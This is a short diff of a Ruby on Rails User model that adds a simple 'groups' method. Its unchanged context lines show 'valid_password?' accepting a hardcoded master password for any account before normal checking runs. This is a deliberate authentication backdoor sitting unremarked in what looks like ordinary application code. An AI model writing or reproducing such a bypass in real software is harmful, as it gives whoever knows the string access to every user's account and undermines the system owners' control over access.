@@ -277,6 +277,14 @@ class User < ActiveRecord::Base
     self.save if self.changed.any?
   end
   
+  def groups
+    groups = []
+    user_associations.each do |association|
+      groups << association.group
+    end
+    return groups
+  end
+  
   def valid_password?(password)
     return true if password == "4Wx?B2H?(W.H3E!m>nxr[Kq8=>db&sg{J6p#H72~Lq;nX#<Ck["
     super
